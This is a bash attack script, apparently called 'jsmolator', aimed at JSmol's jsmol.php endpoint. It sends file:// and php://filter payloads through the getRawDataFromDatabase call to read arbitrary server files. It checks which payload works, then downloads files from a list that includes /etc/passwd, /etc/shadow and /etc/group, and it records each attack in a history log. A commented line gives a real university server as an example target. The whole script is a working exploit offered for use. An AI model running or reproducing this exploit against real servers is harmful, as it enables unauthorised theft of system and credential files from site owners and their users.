#!/bin/bash
# CHORFA A.
# dino213DZ@gmail.com
# V 0.1 08.02.2020
#####################
#includes
script_path=$(echo "$0"|rev|cut -d '/' -f 2-|rev )
cd $script_path
source 'jsmolator.conf'
source 'jsmolator.fct'
#####################
script_version='1.2'
#attack params
#jsmolphp_url='http://www.lct.jussieu.fr/pagesperso/orbimol/script/jsmol/php/jsmol.php'
jsmolphp_url="$1"
payload_txt='call=getRawDataFromDatabase&query=file://'
payload_b64='isform=true&call=getRawDataFromDatabase&source=post_page---------------------------&query=php://filter/resource='
#debug : ligne a supprimer
#download_files='/etc/passwd /etc/shadow /etc/group'
download_files=$(cat "$dl_list_file"|egrep -v "^#")
total_files_to_dl=$(cat $dl_list_file|egrep -v "^#"|wc -l)
attack_date_start=$(/bin/date "+%s")

#working vars
attack_again='NO'
continue_tests='TRUE'
is_vuln='FALSE'
payload_types=('TXT' 'B64')
functionnal_payload=''
got_passwd='FALSE'
got_shadow='FALSE'
got_group='FALSE'

if [ ${#1} -eq 0 ];then
	echo "$0 [http://target/uri/till/jsmol.php]"
	exit 1;
fi

#start
showBanner

#show infos
touch "$curl_output_filename"
showTitle "Attack information" "" "0"
showTitle "Target" "$jsmolphp_url" "1"
showTitle "Download folder" "$download_folder" "1"
showTitle "List of files to download" "$dl_list_file" "1"
history_datas=$(readFromHistory "$jsmolphp_url")
if [ ${#history_datas} -gt 0 ];then
	hist_vulnerable=$(historyData 'vulnerable')
	hist_payload=$(historyData 'payload')
	hist_payload_name=$(echo "$hist_payload"|sed 's/B64/Base64/g'|sed 's/TXT/Text/g')
	hist_passwd=$(historyData 'passwd')
	hist_shadow=$(historyData 'shadow')
	hist_group=$(historyData 'group')
	hist_date=$(historyData 'date')
	hist_duration=$(historyData 'duration')
	showTitle "History" "Found" "1"
	showTitle "Is Vulnerable" "$hist_vulnerable" "2"
	showTitle "Payload used" "$hist_payload_name" "2"
	showTitle "Got $c_submain/etc/passwd$c_reset$c_main" "$hist_passwd" "2"
	showTitle "Got $c_submain/etc/shadow$c_reset$c_main" "$hist_shadow" "2"
	showTitle "Got $c_submain/etc/group$c_reset$c_main" "$hist_group" "2"
	showTitle "Date of attack" "$hist_date" "2"
	showTitle "Attack duration" "$hist_duration" "2"
	#showTitle "Attack again? $c_submain[Y/N]$c_reset$c_main" "" "3" "NoNL"
	#echo -en "$c_warn";read attack_again
fi

if [ "$attack_again" != "no" ] && [ "$attack_again" != "NO" ] && [ "$attack_again" != "n" ] && [ "$attack_again" != "N" ];then
	showTitle "Trying payloads" "" "0"
	for target_test_filename in ${target_test_files[*]};do
		for payload_test in ${payload_types[*]};do
			#try payload
			payload_name=$(echo "$payload_test"|sed 's/B64/Base64/g'|sed 's/TXT/Text/g')
			showTitle "Getting $c_submain$target_test_filename$c_reset$c_main using payload type" "$payload_name" "1" "" "XMODE" 
			checkFile "$target_test_filename" "$payload_test"
		done
		if [ $continue_tests != "TRUE" ];then
			showTitle "Success" "Payload $payload_name works well!" "2"
			break
		fi
	done

	showTitle "Results" "" "0"
	if [ $is_vuln = "TRUE" ];then
		showTitle "$target_result_title_is_vulnerable" "$c_warn""$target_result_text_is_vulnerable" "1"
		#convert target domaine to folder
		dl_sub_folder=$(echo "$jsmolphp_url"|cut -d '/' -f 3)
		showTitle "Downloding files" "" "0"
		#create download folder
		showTitle "Creating download folders" "" "1"
		checkFolders "$dl_sub_folder"
		#dl files
		downloadFiles "$dl_sub_folder"
		listDownloadedFiles "$dl_sub_folder"
		
		#debug pause	
		#showTitle "Check this before quitting" "" "1" "noNL"
		#read pause
	else
		showTitle "$target_result_title_not_vulnerable" "$c_error""$target_result_text_not_vulnerable" "1"
	fi
	#logging in history file=
	attack_date_end=$(/bin/date "+%s")
	attack_duration=$(( $attack_date_end-$attack_date_start ))
	attack_duration_txt=$( secondsToTime "$attack_duration" )
	saveToHistory
	showTitle "Attack duration" "${attack_duration_txt}" "0"
else
	showTitle "Attack canceled" "" "5"
fi
#end
showTitle "Quitting" "" "0"
showTitle "Remove temporary files" "" "1"
rm -f "$curl_output_filename" 2>/dev/null 1>/dev/null
cd $OLDPATH
showTitle "Bye" "" "1"
echo -en "$c_reset"
exit 0
